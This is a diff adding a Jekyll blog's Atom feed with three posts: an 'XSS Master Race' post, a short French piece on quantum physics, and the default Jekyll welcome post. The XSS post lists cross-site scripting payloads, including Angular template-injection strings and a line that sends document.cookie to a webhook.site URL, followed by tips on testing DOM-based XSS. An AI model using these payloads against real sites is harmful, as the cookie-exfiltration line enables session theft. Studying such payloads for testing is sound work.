@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="fr_FR"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="fr_FR" /><updated>2023-10-24T23:25:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Denverledinosor</title><subtitle>Ce blog est à moi</subtitle><entry><title type="html">XSS Master Race</title><link href="http://localhost:4000/xss/" rel="alternate" type="text/html" title="XSS Master Race" /><published>2023-10-24T08:35:09+02:00</published><updated>2023-10-24T08:35:09+02:00</updated><id>http://localhost:4000/XSS%20master%20race</id><content type="html" xml:base="http://localhost:4000/xss/">&lt;h1 id=&quot;postxss&quot;&gt;PostXSS&lt;/h1&gt;
+
+&lt;p&gt;Hi everyone it’s Denverledinosor and welcome to this new post about XSS&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here is a couple of Payload :&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Classic
+
+javascript:alert(document.cookie)
+cookie=&apos;.concat(document.cookie);//
+&apos;;document.location.href=&apos;https://webhook.site/03d5790c-ca53-47be-bd66-3ceca1d48f1f/?cookie=&apos;.concat(document.cookie);//
+
+DOM XSS
+
+&apos; % &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
+&apos; - &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
+&apos; + &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
+&apos; / &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
+&apos; ^ &amp;lt;alert(1); //
+&apos;;alert(1);&apos;
+
+DOM XSS Angular
+
+{{1+1}}
+{{$eval.constructor(&apos;alert(1)&apos;)()}}
+{{$eval(5,5)}}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Petits conseils pour les XSS Basées sur le DOM&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Regardez le rendu de votre entrée sur le code source.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;On this type of vuln, we have the possibility of being able to visualize our actions and the repercussions they have. For example, checking that quotes have been escaped.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Look at the errors that the console displays to you
+your browser.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Errors
+allow you to understand many things about the code, and often in this genre
+of XSS errors, that’s a good sign! This means that we managed to do
+carry out things on the site that were not initially planned. Look
+errors are therefore essential.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;https://0xhorizon.eu/fr/articles/xss-dom-based/&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">PostXSS</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/xss.png" /><media:content medium="image" url="http://localhost:4000/assets/uploads/xss.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Quantic Post</title><link href="http://localhost:4000/quantic/" rel="alternate" type="text/html" title="Quantic Post" /><published>2023-10-19T08:35:09+02:00</published><updated>2023-10-19T08:35:09+02:00</updated><id>http://localhost:4000/quantic</id><content type="html" xml:base="http://localhost:4000/quantic/">&lt;h1 id=&quot;quantic&quot;&gt;Quantic&lt;/h1&gt;
+
+&lt;p&gt;La physique quantique est une branche fascinante de la science qui étudie le comportement des particules subatomiques et les interactions fondamentales de l’univers. Elle remet en question notre compréhension classique de la réalité et nous fait découvrir un monde étonnant où la superposition, l’interférence et l’intrication règnent en maître. La physique quantique a des applications dans de nombreux domaines, tels que l’informatique quantique, la cryptographie quantique et la médecine quantique. Elle continue de repousser les limites de notre connaissance et de nous offrir de nouvelles perspectives sur la nature de l’univers.&lt;/p&gt;
+
+&lt;p&gt;:::&lt;/p&gt;
+
+&lt;p&gt;Effondrement de la fonction d’onde lorsque la fonction probabiliste est non fonctionnelle&lt;/p&gt;
+
+&lt;p&gt;Intrication quantique changement de l’état de deux particules d’un système quelle que soit la distance qui les sépare&lt;/p&gt;
+
+&lt;p&gt;Effondrement de la fonction d’onde lorsque la fonction probabiliste est non fonctionnelle&lt;/p&gt;
+
+&lt;p&gt;Intrication quantique changement de l’état de deux particules d’un système quelle que soit la distance qui les sépare&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Quantic</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/logo.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/logo.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/welcome/" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2023-10-18T15:06:09+02:00</published><updated>2023-10-18T15:06:09+02:00</updated><id>http://localhost:4000/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/welcome/">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
